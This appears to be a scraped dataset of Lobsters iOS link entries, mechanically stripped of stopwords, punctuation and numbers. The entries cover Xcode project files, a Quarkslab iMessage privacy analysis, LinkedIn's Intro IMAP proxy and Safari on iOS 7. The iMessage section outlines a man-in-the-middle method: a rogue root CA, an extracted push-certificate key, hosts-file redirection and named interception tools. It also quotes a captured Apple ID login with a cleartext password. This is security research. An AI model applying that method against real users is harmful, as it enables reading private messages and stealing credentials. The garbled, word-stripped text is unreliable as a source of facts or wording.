follow understand file constructed example maingroup point root file group follow reference quickly see project structure represented pbxproj file let look something related build process target key point build target definition target objcio objcio test following first reference find target definition objcio isa pbxnativetarget buildconfigurationlist build configuration list pbxnativetarget objcio buildphases check pod manifestlock source framework resource copy pod resource buildrules dependency pbxtargetdependency pbxtargetdependency name objcio productname objcio productreference objcioapp producttype comappleproducttypeapplication buildconfigurationlist point available configuration usually debug release following debug reference finally end option build setting tab stored debug isa xcbuildconfiguration baseconfigurationreference podsxcconfig buildsettings alwayssearchuserpaths yes assetcatalogcompilerlaunchimagename launchimage codesignentitlements objcioobjcioentitlements buildphases attribute simply list build phase defined xcode easy identify luckily xcode augments id object real name cstyle comment buildrules attribute empty defined custom build rule project dependency list target dependency defined xcode build phase tab scary leave exercise go remaining part project file follow object id get hang understand different section relate project setting xcode figuring went wrong case complicated merge conflict becomes pretty easy even start read project file github without cloning project opening xcode conclusion modern software built complex stack software like library build tool turn built top lowerlevel stack like peeling onion layer layer whole stack way silicon probably complex one person comprehend realization actually peel next layer understand going empowering magic large pile layer stacked top layer fundamentally building block looking hood build system peeling one layer need understand whole stack gain insight going hit run button take look one level deeper find wellorganized controllable sequence call tool investigate like encourage read article issue take next layer onion
563,Lobsters,ios,Apple iOS,iMessage Privacy,http://blog.quarkslab.com/imessage-privacy.html,imessage privacy,presentation quick answer instant messaging eavesdropping certain category information provide law enforcement group choose retain example conversation take place imessage facetime protected endtoend encryption one sender receiver see read themapple decrypt data lack certificate pinning protocol client push es server client device apsd imagent push protocol local push notification great keeping user informed timely relevant content whether app running background inactive notification display message play distinctive sound update badge app icon client certificate pushtoken mitm push layer imessage id appleid uri pushtoken sending imessage ecdsa rsa imessage payload ua p sending attachment imessage easter egg trick mitm attack test protocol onesided mitm dhillon belinda evil dhillon belinda dhillon evil evil belinda evil bel dhillon belinda bel evil dhillon evil belinda dhillon belinda evil belinda belinda dhillon belinda dhillon evil evil dhillon evil dhillon evil dhillon bel dhillon evil bel evil twosided mitm dhillon belinda evil dhillon belinda dhillon belinda dhillon belinda dhillon evil evil belinda evil bel dhillon belinda bel evil dhillon evil belinda evil evil bel evil evil bel evil belinda dhillon evil belinda belinda dhillon evil dhillon belinda evil dhillon belinda mitm replacing apple evil dhillon evil belinda dhillon evil belinda belinda evil dhillon evil belinda dhillon mitm apple endtoend encryption enough apple certificate apple need since traffic going anyway push server apple owns key server es example conversation take place imessage facetime protected endtoend encryption one sender receiver see read themapple decrypt data preventing mitm apple others imitmprotect imessage overencryption last word apple read imessages fast answer reference,imessage probably one trendy instant messaging system apple present secure high cryptographic standard including endtoend encryption preventing even apple reading message true presentation download slide presentation gave quick answer saying apple read imessages saying apple read imessages choose required government order apple claim endtoend encryption weakness key infrastructure controlled apple change key anytime want thus read content imessages also remember content message one thing metadata also sensitive rely apple carry message thus metadata read article jump end article summarized instant messaging eavesdropping year every time new instant messaging service risen lot people ask question security remember blackberry skype beginning claimed encrypted thus secure impossible eavesdrop year later answer coming everywhere deny people working security industry surprise role government ensure security people government need way eavesdrop dangerous people question ethic legal deal power given intelligence agency recently snowden leak showed even worst many people imagined crypto standard backdoored collusion major company massive data collection intrusion everywhere despite context legitimacy government practice lawful interception company involved tried minimize role used simple excuse followed law however one company claimed impossible eavesdrop instant messaging thus unable collaborate u government even requested snowden leak apple published statement called commitment customer privacy question around time imessage siri facetime clearly answered certain category information provide law enforcement group choose retain example conversation take place imessage facetime protected endtoend encryption one sender receiver see read themapple decrypt data according statement apple provide metadata sends message date content conversation would excluded show article true apple get access encrypted message despite endtoend encryption mean apple letter agency answer let go detail analysis lack certificate pinning first thing first notice pretty much traffic encrypted good point communication apple server made secure ssl tunnel need know protocol used packet forged first thing want try see adding certificate perform mitm actually surprised worked easily mean certificate pinning created fake ca added iphone keychain could proxify communication much easily ssl communication arrives proxy generate certificate signed newly added ca everything becomes unencrypted second surprise actually bigger saw appleid password going ssl communication yes clear text password lot good reason send password cleartext ssh instance dont see reason apple get password firstly mean apple replay password using instance email also many website ok apple reason intelligence agency secondly also mean anyone capable adding certificate able proxify communication get user appleid password thus get access icloud account backup buy apps example get post webobjectsvcprofileservicewoawaauthenticateuser contentlength acceptlanguage enus acceptencoding gzip contentencoding gzip host serviceessapplecom accept useragent comappleinvitationregistration mac o connection keepalive xprotocolversion contenttype applicationxappleplist xdsclientid content posted data xml version encoding doctype plist public appledtd plist http plist version dict key password key string icandoaproperkeynote string key username key string timc icloudcom string dict plist tried play certificate came iphone configuration utility software apple solution enterprise manage iphone software used time device plugged ca added device mdm administrator transparently enrolled device consequence company iphones managed want setup proxy invisibly proxify communication iphone thus gain access personal information note certificate pinning performed layer push imessage various problem happen protocol client push es server part describe usual process protocol cryptographic step involved client device device certificate rsa cn push guid obviously guid replaced device guid client mobilesms messageapp application also relies service main apsd apple push server daemon charge carrying message apple device imagent background process imessage task like keeping connection app closed etc message sent someone apple charge transporting message mean thing given destination address uri phone number email instance apple way link device related uri iphones ipads o x system apple know device involved apple brings message proper device let start second point transport protocol called push push protocol push protocol designed remote notification protocol network used imessage course also facetime gamecenter send party application want notify event think facebook whatsapp news application notifying something happened time based protocol push apple defines local push notification great keeping user informed timely relevant content whether app running background inactive notification display message play distinctive sound update badge app icon push behaves transport protocol charge delivering payload whatever set device hence imessage payload regard transport protocol push communication made tl server port come imessage hostnames taken courierpushapplecom client certificate specific device explained right client certificate push certificate generated device registered activated apple connection apple server certificate request sent albertapplecom server run certificate authority called apple iphone device ca charge signing every request certificate sensitive one charge push communication device push communication secured client server authentication certificate directly involved imessage since imessage carried push role play anyway pushtoken push layer work kind magic known apple client side see first write message press send button client request apple es server information needed send message es server sends back piece information pushtoken unique identifier pair idevice two cryptographic key describe right pushtoken computed apple device register service generation pushtoken defined opaque apple since made server side go precise usage see registration provider routing information provider one need register imessage provider also routing information apple need know deliver message matter fact apple fanatic user often one device imessage must delivered device client sends one message actually sends many message recipient pushtokens message delivered idevice message sent apple push network service apns gateway port explained earlier instance o x system one see root joker p aux grep apsd root s systemlibraryprivateframeworksapplepushserviceframeworkapsd root grep apsd root joker lsof p grep tcp apsd root tcp established root joker whois netrange cidr originas netname applewwnet nethandle parent nettype direct assignment regdate updated ref http orgname apple inc orgid address stevens creek blvd city center bldg city cupertino stateprov ca postalcode country u regdate updated ref http apns server receive push magic come play described documentation assume reading apple relies connection apns device based pushtoken message apple able select device push notification must sent mitm push layer attacking push layer attacking mean client apple server order read message since communication relies tl effort needed provide certificate convenient tool pushproxy provides simple api mess received sent message since lot prerequisite needed perform real communication work locally device first need add root ca system keychain proxy certificate trusted way real client trust message proxy easy also need communicate apple said authentication mutual need either inject new certificate albertapplecom use already signed certificate pick option extract private part device push certificate give proxy last least need redirect connection proxy modifying etchosts file device ready see push message push layer imessage payload look like xx byte set depends content message message type xx xx xx xx next length xx xx xx xx identifier byte xx xx topic hash byte xx xx pushtoken byte xx xx imessage payload going imessage payload need give brief explanation imessage id imessage id refer imessage simply im lot information involved im layer appleid already explained heart account apple uri format appleid either email address phone number one appleid several uri email verified link click phone number authorized sim card pushtoken explained earlier used imessage identify device uri registered pushtoken unique uri used device sending imessage user want send imessage firstly provide one several destination uri since communication endtoend encrypted mean either device directly exchange needed key key directory involved somewhere actually directory called es server dont ask u es stand ask apple retrieve key idevice sends following request server get webobjectsqueryservicewoawaquery uritel host contenttype applicationxappleplist xidcert provision certificate xidnonce random nonce timestamp xidsig query signed provision cert example idevice want retrieve key uri important notice request signed yet another certificate called provision certificate generated clientside signed authority called apple id dsid realm ca imessage authentication valid one month corresponding answer look like pushtoken pushtoken clientdata showpeererrors true publicmessageidentityversion publicmessageidentitykey public key buffer actually xml plist converted json make readable example one identity returned however destination uri several device registered account appleid information would given answer contains pushtoken wellknown also carry buffer full public key one ecdsa used verify signature message sent destination uri device way destination uri reply already ecdsa key check signature one rsa used encrypt imessage sent destination uri key setup secured communication destination uri related device imessage payload finish explanation push protocol providing imessage payload see payload made payload apple specific format called bplist binaryplist designed embed serialized data dictionary several kind data defined including usual one nsstring nsnumber nsdate nsarray nsdata nsdictionnary example bplist true e pair p variable length binary data imessage payload deflate compressed u binary data imessage uid c integer messageid push header sp mailto timc icloudcom sender uri binary data sender pushtoken tp mailto markz facebookcom receiver uri ua mac o sender o hardware version v ua field totally useless sent every request apple statistic anyway p field im payload encrypted compressed yes yes encrypted first compressed composed following key byte version short ciphertext length data ciphertext rsa aesctr data ciphered rsa public key recipient byte signature length data signature ecdsa signature ciphertext computed ecdsa private key emitter cleartext data also bplist called inner bplist p array uris discussion group imessage text io v version x imessage html attachment style o x let spend line rsa aesctr data data actual message sent target uris message attachment let u describe built let call ibplist cleartext data random byte generated aes key data encrypted aes ctr mode giving aes ibplist key put beginning output buffer key aes encrypted data ciphered using public exponent oaep padding give buffer buffer signed owner ecdsa key rsa key used one retrieved es server mentioned sending attachment imessage instant messaging service imessage allows send attachment time people sending picture iphone kind file actually used attachment sent actually stored icloud server dedicated repository attachment encrypted aes key sent destination payload imessage altogether link file since encrypted destination rsa key safe rsa key performed file html message file name name width width height height datasize size mimetype mime type utitype uti type mmcsowner identifier mmcsurl url mmcssignaturehex signature filesize size decryptionkey key note seems o x specific easter egg trick adding subject option add subject imessage configuration panel triggered key text inner plist irc geek working o x send message starting displayed differently o x io existence uri verified discussion group mean add fake uri course real uri list make believe destination actually send imessage tom cook instance mitm attack imessage complex relies push lot crypto involved layer section study condition perform mitm attack imessage hopefully made protocol le opaque order set attacker various position sender apple apple receiver want quick dirty overview might want look original paperwork describing mitm test protocol seen main service imessage push server es one order perform attack need impersonate server lot way arp spoofing injecting bgp route simply keep playing etchosts push proxy earlier tool used python able run following tool pushproxy imessagemitmpy handler intercept imessages essmitmpy intercept modify apple es response dns proxy software used dnschef crypto point view added root ca target keychain able serve certificate complaint idevice tool running locally ready onesided mitm attacker sender apple server sender idevice let call sender dhillon receiver belinda explain step step going evil guy called evil middle first let start emission message dhillon writes message belinda dhillon idevice make request essapplecom evil intercept request evil request essapplecom belinda information pushtoken rsa ecdsa key evil replaces bel rsa ecdsa key dhillon sends message belinda encrypted assumed bel rsa evil actually key signed dhillon ecdsa key evil intercept im payload decrypt key alter recipher belinda real rsa key since device use dhillon ecdsa private key resign message belinda get message properly signed read everyone notice strong requirement attacker evil get access sender ecdsa private key let see happening belinda answering message belinda writes messageit ciphered dhillon rsa key signed belinda ecdsa key message sent apple push server dhillon mobile evil intercept message evil decrypt message access dhillon rsa private key evil change message recipher dhillon rsa public key evil sign modified message ecdsa key dhillon believe bel see step previous description dhillon receives forged message check signature evil ecdsa key believing bel everything fine decipher message private rsa key reception strong requirement attacker evil need get access rsa private key twosided mitm thinking big want perform mitm dhillon belinda time assume evil running mitm dhillon belinda idevice example dhillon sending message belinda dhillon writes message belinda dhillon idevice make request essapplecom evil intercept request evil request essapplecom belinda information pushtoken rsa ecdsa key evil replaces bel rsa ecdsa key dhillon sends message belinda encrypted assumed bel rsa evil actually key signed dhillon ecdsa key evil intercept im payload decrypt key alter recipher key sign key message sent apsn delivered belinda device since evil side thing symmetric let go evil receives message bel idevice evil deciphers payload rsa private key evil encrypts message bel rsa public key evil sign encrypted message ecdsa key since provided key belinda presenting dhillon evil delivers message belinda belinda check signature ok appears dhillon since signed evil key dhillon ecdsa alleged key belinda deciphers message main requirement evil time dhillon apple end belinda apple end still strong requirement attacker nt need user private key anymore mitm replacing apple let u perform excise assuming attacker able replace apple perform mitm assume huge requirement huge network control redirect traffic idevice dns whatever verified push es certificate target clearly many people capability maybe letter agency know would work like classical mitm evil give rsa ecdsa dhillon evil give rsa ecdsa belinda dhillon sends message evil read change resign passing belinda belinda receives deciphers message rsa key check signature evil ecdsa key even belief dhillon since evil really middle thing belinda answer dhillon requirement work need valid ca device target attacker need redirect traffic target need provide key target impersonating end communication obviously attack realistic average attacker mitm apple endtoend encryption enough actually attacker fulfill requirement let look apple position work need valid ca device target apple certificate attacker need redirect traffic target apple need since traffic going anyway push server need provide key target impersonating end communication apple owns key server es definitely apple perform mitm tamper key send target remember imessages encrypted rsa key encrypts aes key since apple change key apple decrypt aes key consequence content message remember apple statement example conversation take place imessage facetime protected endtoend encryption one sender receiver see read themapple decrypt data yes endtoend encryption apple claim key infrastructure trustworthy apple decrypt data want probably ordered preventing mitm apple others actually many solution main problem come apple control key infrastructure solution make key infrastructure le opaque public encrypt message key controlled apple solution active development stay tuned information imitmprotect developed simple mac o x application imitmprotect hook function involved imessage application simple stupid pushtokens key received stored local database time token key received look corresponding uri database check houston problem soon jailbreak available port cydia package imessage overencryption one considers imessage insecure channel solution encrypt data sent channel setting encryption easy even without considering general condition use cant say except tricky last word apple claim cant read endtoend encrypted imessage definitely true everyone suspected yes suspecting knowing hope dig enough protocol show apple could shall continue use imessage mitm attack imessage unpractical average hacker privacy imessage good enough average user information exchanged sensitive point want government agency look apple make transparent pki document protocol could considered practical secure realtime messaging system available apple read imessages fast answer yes skip part dont want spoil detail hurry want answer part analyzed imessage apple instant messaging service wondering eavesdrop imessage fact involved cryptography based wellknown algorithm aes rsa ecdsa proper key size implementation code charge key generation open source certificate pinning performed client push server apple server involved imessage authentication client apple server protected strong obfuscation whitebox cryptography preventing development party imessage client user password sent cleartext secure ssl channel apple clearly issue people using password several place mail bank whatever apple know password pinning cleartext password mean somebody manages add certificate device perform mitm thus get user appleid password key everything belonging user bonus device connected iphone configuration utility apple enterprise solution management iphones trusted ca added consequence subsequent certificate signed ca trusted create ssl communication mean company using able retrieve employee appleid password simply proxifying ssl communication imessage carried push protocol protocol used facetime gamecenter notification service push tunneled inside ssl apple push server port every apple device identified unique pushtoken someone sends one message client look pushtokens related destination called uri transport message every device uri registered one sends imessage client firstly connects apple key server called es get target public key client retrieves key one ecdsa used verify signature message sent destination uri device way destination uri reply already ecdsa key check signature one rsa used encrypt imessage sent destination uri imessage payload actually binary plist designed embed serialized data dictionary imessage payload encrypted random aes key key appended beginning encrypted payload first bit encrypted destination rsa key every message signed sender ecdsa key imessage used send attachment stored icloud encrypted aes session key explained since apple control es server imessages routed apple push server apple able perform mitm apple sends fake public rsa ecdsa key sender apple decipher alter payload message sign sending final destination yes endtoend encryption apple claim weakness key infrastructure controlled apple change key anytime want thus read content imessages reference
564,Lobsters,ios,Apple iOS,LinkedIn Intro: Doing the Impossible on iOS,http://engineering.linkedin.com/mobile/linkedin-intro-doing-impossible-ios,linkedin intro impossible io,linkedin intro intro came rapportive work wherever member work impossible extending io mail client imap deferrable gratification lspace impossible interactive ui email impossible dynamic content email impossible easy installation configuration profile security privacy pledge privacy conclusion intro update linkedin intro pledge privacy,editor note since issued post bishop fox extensively tested linkedin intro clarified earlier assumption see bishop fox post recently launched linkedin intro new product show linkedin profile right inside native iphone mail client right extended apple builtin io mail app feat many people consider impossible post short summary intro work way bent technology intro see glance picture person emailing learn background connect linkedin look like iphone mail app intro intro came origin intro go back acquisition rapportive linkedin rapportive built browser extension modified gmail show profile email sender within gmail page product popular people kept asking love rapportive gmail mobile magic rapportive remember use installed right inside email showing everything need know contact need fire new app search another browser tab information right need feel natural linkedin want work wherever member work know professional spend lot time phone checking replying email figure enhance mobile email giving professional information need brilliant people ask io engineer api extending builtin mail app iphone wanted build something like rapportive people would tell impossible yet figured impossible extending io mail client key insight extend mail client add information message one way would modify message server modification would appear client desktop mobile would user want instead add information message using proxy server rewriting message using imap proxy normally device connects directly server email provider gmail yahoo aol etc configure device connect intro proxy server instead intro proxy server speaks imap protocol like email provider store message instead forward request device email provider forward response email provider back device en route insert intro information beginning message body call top bar great thing approach proxy server tailor top bar device since know device downloading message adapt layout appropriate screen size take advantage client latest feature need worry compatibility device proxy server written ruby using eventmachine allows efficiently handle many concurrent imap connection developed library make evented programming model nicer work including deferrable gratification lspace impossible interactive ui email ok way adding information sender message far static piece html top bar deliberately minimal want get way awesome could tap top bar see full linkedin without leaving mail app impossible cry run javascript mail client true javascript email simply ignored io mail powerful cs capability since us rendering engine safari recall cs hover state triggered hover mouse element used popup menu navigation many website tooltips touchscreen device hovering clicking tapping littleknown fact cs mobile safari certain circumstance tapping link simulates hover state link tapping twice effect click thanks feature popup menu tooltips still work io creativity figured use effect create interactive user interface within message tap top bar see full linkedin profile cs trick embed entire linkedin profile message impossible dynamic content email hover trick allows u interactivity within message complex interaction take browser run normal web app without mail app limitation example want connect contact linkedin take safari fine leaf u problem top bar need show already connected someone say send invitation person accepts connected open email still say connected message downloaded imap client may assume message never change cached device unlike web page never get refreshed connected top bar content need change update solution connect button tiny iframe refreshed every time open message open message device offline problem iframe positioned top identicallooking button static top bar html iframe fails load simply fall back connection status time message downloaded allows top bar contain dynamic content even though impossible server modify message downloaded device using embedded iframe keep connection status uptodate within otherwise static top bar impossible easy installation got imap proxy working faced another problem configure device use proxy expect user manually enter imap smtp hostnames choose correct tl setting etc tedious errorprone fortunately apple provides friendly way setting email account using configuration profile facility often used enterprise deployment io device using technique simply ask user email address password autodiscover email provider setting send configuration profile device user need tap ok time new mail account moreover gmail google apps account use oauth never need ask user password even better io configuration profile make setup new email account breeze security privacy understand operating email proxy server carry great responsibility respect fact email may contain personal sensitive information everything make sure safe principle key security measure detailed pledge privacy conclusion first built rapportive gmail people thought crazy writing browser extension modified gmail page fly effectively writing application inside someone else application turned great success many others since followed footstep written browser extension gmail similarly intro approach proxying imap novel way delivering software user operates limit technically possible big advantage enhance apps already use course idea limited iphone watch new platform coming way soon post scratched surface interesting challenge overcome building intro followup post talk cs technique testing monitoring tool thing achieve high performance high reliability meantime check intro let u know think update wanted provide additional information linkedin intro work address question raised point want reinforce order make sure member understand product work optin install intro see linkedin profile email usernames password oauth token email content permanently stored anywhere inside linkedin data center instead stored iphone install intro new mail account created iphone email new intro mail account go via linkedin mail account affected way communication mail app linkedin intro server fully encrypted likewise communication linkedin intro server email provider eg gmail yahoo mail fully encrypted email accessed mail app retrieving email email provider linkedin server automatically look email address intro inserted email additional question please visit linkedin intro pledge privacy provides detail hope give information intro work goal make member productive successful think linkedin intro help u towards achieving goal
565,Lobsters,ios,Apple iOS,Apple Special Event October 2013,http://www.apple.com/apple-events/october-2013/,apple special event october,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
566,Lobsters,ios,Apple iOS,"Safari on iOS 7 and HTML5: problems, changes and new APIs",http://www.mobilexweb.com/blog/safari-ios7-html5-problems-apis-review,safari io problem change new apis,safari io buggiest safari version nutshell ui change new device markup apis cs home screen webapps native webapps new browser full screen big problem apps game toolbars never hide richard davey http wwwbbccoukcbeebies theflashguy go title new add home button share icon gesture control center careful suggesting user swipe bottom canvas history gesture icon size bookmark favorite new device markup support video track track iso format styling caption track element api progress output element removed datetime input type support datetime input type anymore seamless iframe javascript apis webgl fullscreen webrtc getusermedia indexeddb support yet live demo airplay api new safari webkit web developer background execution webspeech synthesis api ssml format speech synthesis markup language speech synthesis api work user explicit action online demo browsing adagjmawam device change websql bug websql api update update cs support sticky position report try demo cs region cs region online demo cs grid layout cs grid layout cs flexbox dynamic font cs improvement homescreen webapps big issue standard dialog working update webapps open external uri update install apps home screen strange thing appftcom patterndksun update update test suite status bar update launch image multitasking native webapp development nitro engine yet paginate mode paginate improvement remote debugging preview yet anything else,safari io change new apis apple rolled io iphone iphone expected apple published necessary information web developer say without fear mistake buggiest safari version since post show new apis ability problem need deal right website webapp nutshell time reading long post ui change toolbar tint problem new fullscreen navigation new home screen icon size title usage iphone possible conflict new gesture new device nothing new web developer iphone markup video track progress removed support input typedatetime apis page visibility airplay api canvas enhancement removed support shared worker web speech synthesis api unprefixed web audio animation timing mutation observer minor addition big problem websql using cs region sticky position flexbox clippath unprefixed transition enhancement home screen webapps several severe problem example alert support native webapps web view pagination javascript runtime native apps video playing new ability new browser safari well native apps received biggest update user interface experience since version change affect user interact website webapp react safari tint toolbars url bar bottom toolbar iphone based background color loading page b current main color behind bar scrolling want hack initial tint different background body tint without adding noise html new container use following cs hack body backgroundcolor blue backgroundimage lineargradient bottom green green hack define background color image content use image case gradient also data uri image next example see first two sample color background last example one tint color background color body tint full screen big problem apps game web browsing always full screen iphone ipod touch user scroll page portrait orientation bottom toolbar disappear url bar transformed small semi transparent bar top landscape user scroll page bottom toolbar host domain bar disappear leaving complete fullmode toolbar full url bar appear user tap domain host top user start scroll back top next picture show ui change scrolling landscape portrait mode fullscreen problem resize event firing anymore toolbar appearingdisappearing detect change javascript medium query old hack using windowscrollto hide url bar work anymore therefore way hide url bar toolbar without user intervention scrolling page using natural scroll problem detailed update bottom part canvas interactive anymore detail later using non natural scrolling layout iframes section overflow scroll javascriptbased scrolling mechanism toolbars never hide even problematic somehow user get fullscreen mode able go back normal mode example see twitter website using overflow scroll landscape mode scrolling area le screen toolbars never go away io honest go portrait landscape sometimes get fullscreen without scrolling get need test get idea problem scrolling back restore toolbars making thing complicate game also post started apple forum beta lot people complaining problem richard davey actually real issue u broken display game bbc site try anything http wwwbbccoukcbeebies example removal fullscreen button removal hack way make game go full screen crammed tiny window middle browser iphones enter page landscape mode screen area available control cover full screen theflashguy need control appearance disappearance browser bar landscape mode far easy user break mode touching top bottom screen break lot website web apps whose major ui nav element tend sit top bottom content area way truly fullscreen experience website one wonderful aspect io losing major step backwards richard davey game fullscreen fullscreen mode bottom portion page interactive anymore problem affect toolbar link form item bottom part viewport fullscreen mode scroll example fixed toolbars bottom one example click portion viewport matter click fire fullscreen dismiss action therefore safari toolbars appear need tap interactive item activate therefore two tap action button example test go scroll try click bottom toolbar example try click album next image open safari toolbar need click album go bottom toolbar title next big change safari ui iphone title area page title iphone replaced current host domain see next image page title available browsing tab iphone io removed title iphone io page title ignored user browsing document ipad fullscreen mode toolbar title bar always visible new add home button io changed share icon new add home screen button whole ui changed including new icon replacing share icon new style every website inviting user add bookmark home screen need update icon gesture operating system safari offer new gesture might impact website mostly detecting gesture control center appears swipe bottom screen version full screen bottom screen might part website safari toolbar therefore careful suggesting user swipe bottom canvas b history gesture second probably problematic gesture swipe right left border safari trigger back forward action browsing history √† la internet explorer window mode gesture might conflict website inviting user swipe left right without nice margin around honest problem right chrome problem even weirder single page webapps inside safari using history api using hash hack manage app state user start back gesture see two image app user app sidebyside scroll gesture yahoo homepage might usability issue user start gesture border even trigger touch event swipe right left gesture border trigger back forward action browser history gesture back animation slide right also making conflict ui framework jquery mobile sencha touch user gesture go back two animation rendered browser framework also previous page left one specific scroll position snapshot slide animation ok page load top keeping scroll position way prevent gesture managed o browser hopefully history gesture available home screen webapps uiwebviews phonegap apps icon size new o icon bigger previous version example retina iphone device instead previous system icon also flat shiny effect anymore might want update icon match new design use appletouchicon link new size value appletouchicon precomposed version still supported make result appletouchicon shiny effect anymore icon define precomposed version take precedence available icon size io iphone ipod touch retina ipad nonretina ipad ipad mini ipad retina need remember io available nonretina iphonefactor device provide new size device pick io related one want cover possible icon io code look like link rel appletouchicon href size link rel appletouchicon href size link rel appletouchicon href size link rel appletouchicon href size link rel appletouchicon href size link rel appletouchicon href size link rel appletouchicon href size bookmark favorite bookmark new icon available see left image seems way define icon specifically yet well text favorite see right image appear click url bar seems use appletouchicon link follow size rule found weird situation website proper link element taking icon favorite favorite new device day iphone iphone available market good news web development perspective exactly iphone screen size pixel density ability may faster nothing worry coding perspective new touch id feature fingerprint scanner available web site yet cpu change anything javascript developer perspective said io simulator ability emulate cpu markup support video track video element support track child subtitle andor closed caption support multiple language appear picker inside video player user change language andor disable caption track picker html video track possible track type kind attribute support caption subtitle define language srclang attribute iso format en english subtitle useful user hear audio shehe understand language caption user hear audio includes additional information happening background musing playing closedcaption menu defining label attribute track worthless io ignored language name used instead menu optional cc suffix using caption instead subtitle kind value video source src track kind caption src mycaptionsenvtt srclang en track kind subtitle src mycaptionsfrvtt srclang fr video track accessed javascript api use loop cue track file might useful ipad truly embed video web canvas instead always fullscreen mode iphone track element follow crossdomain policy default video track origin must using javascript detect track available using webkithasclosedcaptions var hascc documentqueryselector video webkithasclosedcaptions also change caption visibility using webkitclosedcaptionsvisible boolean property every video element styling caption cs perspective io support new cue pseudoelement change textshadow opacity outline property color font style ignored cue opacity track element api mind api might work safari progress output element progress element supported creating progress bar screen based max value indeterminate progress support browser suitable know determinate value activity progression progress max value output element supported think excited meter seems supported content ignored nothing rendered screen think bug removed datetime input type following google chrome safari io support datetime input type anymore fallback text type deprecated standard favor datetimelocal using two input date time purpose problem datetime compatible io version using careful week input type still available instead falling back text input type rendered noninteractive control datetime remmoved using input type datetime act immediately rendered text input type seamless iframe new boolean seamless attribute iframes available io create borderless iframe website iframe scrollbars default get height inner content appearing website using space block element dom iframe seamless src mypagehtml iframe javascript apis let start bad news webgl fullscreen webrtc getusermedia indexeddb support yet term new apis available page visibility api xhr full implementation video track api already covered airplay api cs region api canvas enhancement removed support shared worker webspeech synthesis api page visibility api webkitprefixed io detect tab go foreground background try live demo xmlhttprequest spec fully compatible mean request blob response video track api already covered quickly allow u query navigate track content medium element cs region api appears part cs region spec covered later basically prefixed webkitgetflowbyname function available every dom element canvas drawing api globalcompositeoperation attribute canvas context allows u define blending mode multiply drawing different layer top also new path constructor draw canvas context allowing u store path later usage instead drawing directly canvas airplay api airplay api need explanation airplay wireless streaming solution apple allows device stream content different device usually apple tv safari already supported xwebkitairplay html attribute define want airplay customize experience api allows u customize player get information event streaming airplay every video element eventswebkitplaybacktargetavailabilitychanged webkitcurrentplaybacktargetiswirelesschanged remind u terrible idea using underscore camel case technique event name convention javascript first event fire new airplay target apple tv available available anymore second playback status one target changed think webkitcurrentplaybacktargetiswirelesschanged record longest javascript event name ever streaming target available offer user button pick target calling video webkitshowplaybacktargetpicker function official documentation api yet check video new safari webkit web developer wwdc session covered topic background execution several use case background execution user changing tab tab selection screen code still executing image frozen user changing apps multitasking mode code still executing image updated safari foreground website background tab code frozen safari snapshot last execution ui purpose safari background code frozen webspeech synthesis api update could make api work officially supported working webspeech api allow website record transcript audio well synthesize text voice using internal voice operating system safari io includes synthesis api text speech apis listening audio microphone query available voice speak different language real device returning voice sometimes refresh page get bug think using speechsynthesisgetvoices term english female voice using enus male voice using engb expert voice recognition feel voice api siri sound much natural io make javascript speak website use shortcut version default language define different property following example speechsynthesisspeak new speechsynthesisutterance hello voice webpage var speech new speechsynthesisutterance speechtext hello speechvolume speechrate speechpitch speechlang enus speechsynthesisspeak speech speechsynthesisutterance object also bind event start end please use alert inside event whole safari freeze ask speakable string plain text standard support also xml document ssml format speech synthesis markup language input safari io reading xml important keep mind speech synthesis api work user explicit action clicking button initiate speech onload timebase try online demo browsing adagjmawam device change mutationobserver unprefixed animation timing api also known requestanimationframe unprefixed transitionend event name unprefixed url unprefixed webaudio api new advanced ability new dom property hidden visibilitystate windowdonottrack support websql bug using websql api big issue domexception trying create database bigger previous version limit user permission bug try store user get permission dialog even user grant permission get exception trying get big bug update according tarobomb new york time request le first create database try store data proper confirmation dialog appear first finally finally able store update bug still update cs support term new spec supported mostly webkit prefixed sticky position cs region cs grid layout working cs flexbox dynamic font type sticky position sticky position new experimental feature allow u fix element viewport visible area usually scrolling action like mixing position static position fixed static position move element outside visible viewport one sticky element accumulate area defining position property creating nice effect scrolling similar native uitableview section update report indicate feature available well community get keep position webkitsticky top try demo cs region cs region spec proposed adobe create magazinelike design flow content different container nature screen size use new flow mechanism ipad website webapps selecting content flowing different region allowed io cs exclusion way define shape region usually coming region companion available yet try online demo cs grid layout cs grid layout layout new spec proposed microsoft already available new cs property webkitgridx available enable using display grid display webkitgrid sure different way enable ready yet cs flexbox final spec cs flexbox finally allow u stop insulting float clear everywhere layout element horizontally andor vertically use use display webkitflex container apply different property available dynamic font dynamic font new font type available io adjusts weight letterspacing leading based current font size improve legibility take advantage new feature html using new apple prefixed constant maybe webkit going use prefix future big list constant applesystembody font p font applesystembody cs improvement good news medium query resolution attribute still supported well something new ability query mincolorindex maxcolorindex completely useless also minor update including unprefixed cs transition transitionend event cs clip path clip content based shape including circle rectangle polygon kerning ligature font enabled default background property get compatibility different value boxdecorationbreak sliceclone tabsize style overflowwrap normalhypernatebreakword support unit ch vmax masktype alpha new cue pseudoelement already covered video track section new webkitbackgroundcomposite property make work homescreen webapps using home screen webapps bad news many bug around platform version good news seems limit websql storage full screen need user permission big issue big issue homescreen webapps standard dialog working alert confirm promptupdate io solves bug webapps open external uri website safari make call open appstore etc uri ignoredupdate io solves bug install apps home screen strange thing replacing one webapp another one start seeing clone webapp happens open different webapps time try device go appftcom install webapp go patterndksun install webapp repeat operation several time see mess home screen restarting device seems solve problem portrait mode text input select date picker focus medium query honor orientation landscape resize event fire behavior bug happens home screen webapps web view safari update using application cache also managing state hash technique history object keep navigation history therefore historyback never work historylength stay forever thanks people reported problem update cooky transferred website webapp installing icon home screen authentication purpose example working working anymore thanks joseph pearson reporting test suite status bar provide applemobilewebappstatusbarstyle meta tag provide one default value status bar become black black black area screen device see battery icon user see clock icon status bar update io still bug black value work ok full mode io new style lastly defining applemobilewebappstatusbarstyle blacktranslucent blackbased anymore fully transparent following new io fullscreen mode apps previous image right unfortunately seems way define background clear dark need test icon clock look like background update text seems always white next picture see default status bar black value blacktranslucent value action status bar home screen webapps launch image multitasking new multitasking system home screen webapp system using white image launch image current status app preview exception webapp still active app see right snapshot next example see financial time webapp white snapshot even correct launch image active execution white screen bug luckily iphone bug home screen webapps anymore letterboxing app year found need viewport hack solution anymore native webapp development developing hybrid native webapps apache cordova phonegap apps news first nitro engine yet paginate mode using uiwebview rich content native apps native webapps hybrid use paginate feature ebook reading experience without vertical scrolling la window app experience feature perfect app showing dynamic content preoptimize pagination different objectivec property configure pagination process enable need use something like mywebviewpaginationmode uiwebpaginationmodelefttoright mywebviewpaginationbreakingmode uiwebpaginationbreakingmodepage mywebviewgapbetweenpages property convert html document web view pagination mode divided 